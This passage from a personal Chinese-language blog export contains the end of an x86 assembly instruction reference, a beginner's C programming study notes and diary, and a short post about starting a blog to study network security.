<p>SCAS： 串扫描。把AL或AX的内容与目标串作比较，比较结果反映在标志位。</p>
<p>LODS： 装入串。把源串中的元素（字或字节）逐一装入AL或AX中。（<a href="https://baike.baidu.com/item/LODSB">LODSB</a> 传送字符， LODSW 传送字，LODSD 传送双字）</p>
<p>STOS： 保存串。是LODS的逆过程。</p>
<p>REP： 当CX/ECX&lt;&gt;0时重复。</p>
<p>REPE/REPZ： 当ZF=1或比较结果相等，且CX/ECX&lt;&gt;0时重复。</p>
<p>REPNE/REPNZ： 当ZF=0或比较结果不相等，且CX/ECX&lt;&gt;0时重复。</p>
<p>REPC： 当CF=1且CX/ECX&lt;&gt;0时重复。</p>
<p>REPNC： 当CF=0且CX/ECX&lt;&gt;0时重复。 [6] </p>
<h2 id="程序转移指令"><a href="#程序转移指令" class="headerlink" title="程序转移指令"></a>程序转移指令</h2><p>控制转移类指令包括无条件转移指令、条件转移指令、循环控制指令、中断指令、子程序调用和返回指令。 [4] </p>
<h3 id="无条件转移指令"><a href="#无条件转移指令" class="headerlink" title="无条件转移指令"></a>无条件转移指令</h3><p>（长转移）</p>
<p>JMP： 无条件转移指令。</p>
<p>CALL： 过程调用。call会做两件事情，其一，将call指令后面的一条指令的地址压入栈中，无条件跳转到call指令调用函数的地址处，开始执行子程序。</p>
<p>RET/RETF： 过程返回。ret指令，则执行call指令后面的一条指令。</p>
<h3 id="条件转移指令"><a href="#条件转移指令" class="headerlink" title="条件转移指令"></a>条件转移指令</h3><p>（短转移，-128到+127的距离内；当且仅当(SF、XOR、OF)=1时，OP1&lt;OP2 ）</p>
<p>JA/JNBE： 大于转移。</p>
<p>JAE/JNB： 大于或等于转移。</p>
<p>JB/JNAE： 小于转移。</p>
<p>JBE/<a href="https://baike.baidu.com/item/JNA">JNA</a>： 小于或等于转移。</p>
<p>以上四条，测试<a href="https://baike.baidu.com/item/%E6%97%A0%E7%AC%A6%E5%8F%B7%E6%95%B4%E6%95%B0">无符号整数</a>运算的结果（标志C和Z）</p>
<p>JG/JNLE： 大于转移。</p>
<p>JGE/JNL： 大于或等于转移。</p>
<p>JL/JNGE： 小于转移。</p>
<p><a href="https://baike.baidu.com/item/JLE">JLE</a>/JNG： 小于或等于转移。</p>
<p>以上四条，测试带符号整数运算的结果（标志S，O和Z）</p>
<p>JE/JZ： 等于转移。</p>
<p>JNE/JNZ： 不等于时转移。</p>
<p>JC： 有进位时转移。</p>
<p>JNC： 无进位时转移。</p>
<p>JNO： 不溢出时转移。</p>
<p>JNP/JPO： 奇偶性为奇数时转移。</p>
<p>JNS： 符号位为 “0” 时转移。</p>
<p>JO： 溢出转移。</p>
<p>JP/JPE： 奇偶性为偶数时转移。</p>
<p>JS： 符号位为 “1” 时转移。 [6] </p>
<h3 id="循环控制指令"><a href="#循环控制指令" class="headerlink" title="循环控制指令"></a>循环控制指令</h3><p>（短转移）</p>
<p>LOOP： CX不为零时循环。</p>
<p>LOOPE/LOOPZ： CX不为零且标志Z=1时循环。</p>
<p>LOOPNE/LOOPNZ： CX不为零且标志Z=0时循环。</p>
<p>JCXZ： CX为零时转移。</p>
<p>JECXZ： ECX为零时转移。</p>
<h3 id="中断指令"><a href="#中断指令" class="headerlink" title="中断指令"></a>中断指令</h3><p>INT： <a href="https://baike.baidu.com/item/%E4%B8%AD%E6%96%AD%E6%8C%87%E4%BB%A4">中断指令</a>。</p>
<p>INTO： 溢出中断。</p>
<p>IRET： 中断返回。</p>
<h2 id="其他指令"><a href="#其他指令" class="headerlink" title="其他指令"></a>其他指令</h2><h3 id="伪指令"><a href="#伪指令" class="headerlink" title="伪指令"></a>伪指令</h3><p>DB： 定义字节（1字节）</p>
<p>DW： 定义字（2字节）</p>
<p>DD： 定义双字（4字节）</p>
<p>PROC： 定义过程。</p>
<p>ENDP： 过程结束。</p>
<p>SEGMENT： 定义段。</p>
<p>ASSUME： 建立段<a href="https://baike.baidu.com/item/%E5%AF%84%E5%AD%98%E5%99%A8%E5%AF%BB%E5%9D%80">寄存器寻址</a>。</p>
<p>ENDS： 段结束。</p>
<p>END： 程序结束。</p>
<h3 id="处理机控制指令"><a href="#处理机控制指令" class="headerlink" title="处理机控制指令"></a>处理机控制指令</h3><p>即标志处理指令，处理机控制指令完成简单的控制功能。</p>
<p>CLC： （进位位置0指令）</p>
<p>CMC： （进位位求反指令）</p>
<p>CLC： （进位位置为0指令）</p>
<p>STC： （进位位置为1指令）</p>
<p>CLD： （方向标志位置0指令）</p>
<p>STD： （方向标志位置1指令）</p>
<p>CLI： （中断标志置0指令）</p>
<p>STI： （中断标志置1指令）</p>
<p>NOP： （无操作）</p>
<p>HLT： （停机）</p>
<p>WAIT： （等待）</p>
<p>ESC： （换码）</p>
<p>LOCK： （封锁）</p>
]]></content>
      <tags>
        <tag>assembly</tag>
      </tags>
  </entry>
  <entry>
    <title>初试c语言——笔记</title>
    <url>/2020/10/02/2020-10-02-%E5%88%9D%E8%AF%95c%E8%AF%AD%E8%A8%80/</url>
    <content><![CDATA[<h1 id="一、c语言小记"><a href="#一、c语言小记" class="headerlink" title="一、c语言小记"></a>一、c语言小记</h1><h5 id="秘诀：多看，多试，多错，多想"><a href="#秘诀：多看，多试，多错，多想" class="headerlink" title="秘诀：多看，多试，多错，多想"></a>秘诀：多看，多试，多错，多想</h5><p>1、作为警示，c语言中需注意，所输入的符号必须是在<em><strong>半角模式下</strong></em>的，否侧将导致运行错误</p>
<p>2、在”{}”里面输入的语句大多要以”;”进行分隔，而在”()”里的语句大多使用”,”分隔</p>
<p>3、添加一些关键字的说明（接下来的学习中都会碰见的）：</p>
<p><strong>auto//声明自动变量（一般可省略）</strong></p>
<p> <strong>break//跳出当前循环</strong></p>
<p><strong>case//开关语句分支</strong></p>
<p><strong>char//声明字符型变量或者函数返回值类型</strong></p>
<p><strong>const//定义常量，如果一个变量被const修饰，那么他的值就不能被改变</strong></p>
<p><strong>continue//结束当前循环，开始下一轮循环</strong></p>
<p><strong>default//开关语句中的“其他”分支</strong></p>
<p><strong>do//循环语句的循环体</strong></p>
<p><strong>double//声明双精度浮点型变量或函数返回值类型</strong></p>
<p>**else//条件语句否定分支与if连用 **</p>
<p><strong>enum//声明枚举类型</strong></p>
<p><strong>extern//声明变量或者函数是在其他文件或者本文件的其他位置定义—–</strong></p>
<p><strong>float//声明浮点型变量或者函数返回值类型</strong></p>
<p><strong>for//一种循环语句</strong></p>
<p><strong>goto//无条件跳转语句</strong></p>
<p><strong>if//条件语句</strong></p>
<p><strong>int//声明整数变量或函数</strong></p>
<p><strong>long//声明长整型变量或者函数返回值类型</strong></p>
<p><strong>register//声明寄存器变量———</strong></p>
<p><strong>return//子程序返回语句（可以带参数，也可不带参数）</strong></p>
<p><strong>short//声明短整数型变量或者函数</strong></p>
<p><strong>signed//声明有符号类型变量或函数</strong></p>
<p><strong>sizeof//计算数据类型或者变量长度（即所占字节数）</strong></p>
<p><strong>static//声明静态变量———</strong></p>
<p><strong>struct//[声明结构体变量]———</strong></p>
<p><strong>switch//用于开关语句</strong></p>
<p><strong>typedef//用于给数据类型取别名</strong></p>
<p><strong>unsigned//声明无符号类型变量或函数</strong></p>
<p><strong>union//声明共用体类型———-</strong></p>
<p> <strong>void//声明函数无返回值或无参数，声明无类型指针——-</strong></p>
<p><strong>volatile//说明函数无返回值或无参数，声明无类型指针——-</strong></p>
<p><strong>while//循环语句的循环条件</strong></p>
<p>4、每输入一个变量时，都需在前对其进行声明，这步才会使变量有意义，否侧将导致错误</p>
<p>5、进行类型转换的时候，需要注意字节问题，一旦字节不够，将得到错误结果</p>
<p>6、注意点：无论对哪个变量，还是字符，都得附上对其明确的定义，初学时常忘记</p>
<p>7、对某一变量声明他的数据类型时一定要一致，例如，定义变量a为整型数（int a），结果计算式中a=3.2+6.4=9.6，但此时a将只会输出9这个整数</p>
<p>8、extern可以放在变量或者函数前面引用不在同一个文件里面的变量</p>
<p>9、全局变量的定义声明放在预命令的下一行较为合适，可以使得全部函数都能调用该全局变量（具体还是看习惯）</p>
<p>10、运算“/”时，如果两边都为整数，则结果为舍去小数的整数部分，如15/4为3，要得到正确答案，要像15.0/4这样，有一个数为浮点数</p>
<p>11、求余符号“%”要求在符号左右两边都必须是<strong>整数</strong></p>
<p>12、赋值运算符左边只能是单个变量</p>
<p>13、运算符优先级别高低：**!&gt;算术运算符&gt;关系运算符&gt;&amp;&amp;&gt;||&gt;赋值运算符&gt;逗号运算符**</p>
<p>14、逻辑运算符一旦确认了逻辑表达式的值就将停止，如（a=0）&amp;&amp;（b=5），检验到a为0，就会停下，不会去运行b=5（补充：因为在c语言中判断真假依据是：非0为真，0为假）</p>
<p>15、~按位取反不能理解为是取了一个负号，可以想想有负号“-”就知道不应该有两个相同作用的符号</p>
<p>16、要运用不同的头文件里的函数的方法就是在预命令中输入你要用的函数所在的头文件</p>
<p>17、用if-else的嵌套格式应为</p>
<p><strong>if（表达式1）+语句1；</strong></p>
<p><strong>else if （表达式2）+语句2······</strong></p>
<p>18、switch 结构：switch（<strong>整型</strong>表达式）｛</p>
<p>case <strong>整型</strong>常量: 语句; break；······</p>
<p>default :语句｝</p>
<p>注：default可以不出现，其作用是指向除case列举的数值之外的数值执行其后面的语句</p>
<p>19、while(条件){循环体} 类型的循环语句，在括号内填入循环运行的条件，花括号里面填写要重复计算的式子</p>
<p>20、do-while类型是 将会<strong>先执行一次循环体</strong>，再判断是否满足条件执行下一次，而while，for是<strong>先判断再执行</strong></p>
<p>21、for(表达式1；表达式2；表达式3)类型里面的三个表达式都能个别省略，  同时循环体可以放进第三个表达式中，但是<em><strong>“；”不能省略，括号里面一定要有两个“；”</strong></em>并且需要注意的是，如果省略了表达式，那么循环停止的条件一定要在循环体内列出，否则将是无限循环。</p>
<p>22、当用for类型进行循环嵌套时，第一个for中执行的变量进入第二个for时，第二个for中变量值都会从最开始设置的值开始进行循环</p>
<p>23、当某结构后面需要执行的语句不止一条时用花括号将所有语句包含</p>
<p>24、当语句中嵌套多种语句时，一定要注意写清楚，分隔好，不然或许连自己查看都会出现障碍</p>
<p>25、break只能在<strong>循环语句和switch语句</strong>中使用，在循环语句中用来跳出当前循环（需要与if连用），在switch只能结束单句语句</p>
<p>26、continue只能用于<strong>循环语句</strong>，与if连用，如果if语句条件满足为真，程序将不会运行至continue之后的语句，而是进入下一次的循环。</p>
<p>27、scanf中的非法输入要注意，虽然看似可能是一种错误，但有效的将之运用，也能让其为我们创造更多的输入</p>
<p>28、可用一些标识符（不能是关键词）加“: ”放在语句前，进行注释，注释后可以用<strong>goto 标识符</strong> 执行在其冒号之后的语句（不建议使用，破坏模块化的结构顺序）</p>
<p>29、对于相同的一个循环问题，可以多想想是否能用不同的循环语句去完成，可以获得更多的思考</p>
<p>30、对于循环嵌套循环的结构，注意重要一点，也是容易搞错的地方：只有内层的循环结束时，才会再继续执行外层的大循环</p>
<p>31、当使用while（1）无限循环的语句时，若是在内部有使用多个输入函数进行取值，并且有些取的类型为字符时需要在其后面添加一个getchar（）来盛放你之前输入的回车键这个字符</p>
<p>32、对于函数定义变量的精度一定要与其使用scanf函数里面的精度一致，否则将出错</p>
<p>33、什么时候用循环语句？当有多个东西类型相似需要重复做多次的，可以想想循环语句能不能用上，将可以简化代码</p>
<p>34、什么时候用嵌套循环（一般为双重循环语句）？当涉及两个需要改变的东西的时候，比如两个方位，两个变量等等</p>
<p>35、if(   )  后面跟的语句可以为空语句，即什么都不输入，表示空语句</p>
<p>36、c语言中｛｝后面有符号的情况：</p>
<p>（1）结构体、共用体、枚举类型的花括号后面要加分号</p>
<p>（2）在二维数组的初始化里面分行进行初始化的花括号后面要加逗号</p>
<p>37、c语言如果是输出结果要求四舍五入，那么可以在printf函数中的如d、f前加上 .a(a为保留的小数位数)；如果是在途中的变量四舍五入，则需要强制类型转换加0.5的做法</p>
<p>38、对于/，再次进行详细说明，对于值是整数的变量，没办法像数字那样直接加个小数点，此时可以换一种思路，就是乘或除以1.0（注意运算顺序！）就可以得到浮点型的结果</p>
<h2 id="二、学习感想"><a href="#二、学习感想" class="headerlink" title="二、学习感想"></a>二、学习感想</h2><p>Date：2020.10.03 </p>
<p>作为一个确确实实的零基础小白，我先从c语言教材基础这本书开始认真看，那句hello world的程序，加上后面的几个程序，一点一点的理解这些对我来说都是全新的东西，从开头预命令，到函数头，函数名，最后语句，才算是对c有了那么些许理解，而这些竟然就花去了我合计一天左右的时间，感叹自己天资愚钝（落泪）。</p>
<p>Date：2020.10.08</p>
<p>感觉这几天有些懈怠，是因为学完了基础教程的第一章，完成了一个小目标而懈怠的吗？我觉得这样不行，今天该重回状态，所以特意早起赶去学习。发现，确实我还有很多很多很多很多（省略n字）不懂，不过这才更有意思，掌握知识的感觉在我看来是十分愉悦的。</p>
<p>Date：202010.09</p>
<p>第一个双休前的晚上，我选择在实训室度过，之后的两天也是，哈哈哈，好吧，确实学的东西好多，感觉自己学不会，没什么天赋。来这发发牢骚。加油！然后就是&amp;（取地址），\n这两个符号容易忘记，导致程序运行有误</p>
<p>Date：2020.10.11</p>
<p>这次学习，只用了一个半小时就把第二章学完了，比起之前快多了（内容较为简单，多是需要记诵的内容），不过应该没掌握很好，后面跟练习熟悉吧，我想在两三周时间之内把c自行结束了，因为有太多的东西等着我去一一摸索，虽然想起来很累，但我竟然觉得兴奋？可能这就是热爱吧？第一次对某个算是学习的事物这么上心，我期待我之后的表现</p>
<p>Date：2020.10.15</p>
<p>今天总算结束了第三章学习，说实话，这章的循环语句与选择语句其实还好，就是需要记住一些格式上的东西，理解还是不难，难点应该在于多种语句的层层嵌套，属实为难人，头发都掉了不少（苦笑），继续努力吧，</p>
<p>Date：2020.11.9</p>
<p>今天才算是勉强完成了整本c语言的学习吧，不过资质愚钝的我，也就是懂了一些语法，知道一些东西，其他的方面，仍然是个小白。害，挺累的其实，不过很充实，和以前浑浑噩噩的生活不同，我觉得，大学，我该出发的，也想成为与众不同的人！</p>
]]></content>
      <tags>
        <tag>学习c时的一些笔记与心得</tag>
      </tags>
  </entry>
  <entry>
    <title>新生</title>
    <url>/2020/09/30/2020-09-30-%E6%96%B0%E7%94%9F/</url>
    <content><![CDATA[<p>  很高兴，总共历时十五小时左右的时间，总算创造了属于我的简陋的博客，感动泪目·doge·<br>将之命名为新生，是因为在此前从未接触过，进入一个全新的领域，进行学习，此刻的我就<br>像一个初生的婴儿般，在网安这个舞台上重生。之后便是学习，学习，学习！强大自己，以此纪念吧</p>
]]></content>
  </entry>
</search>
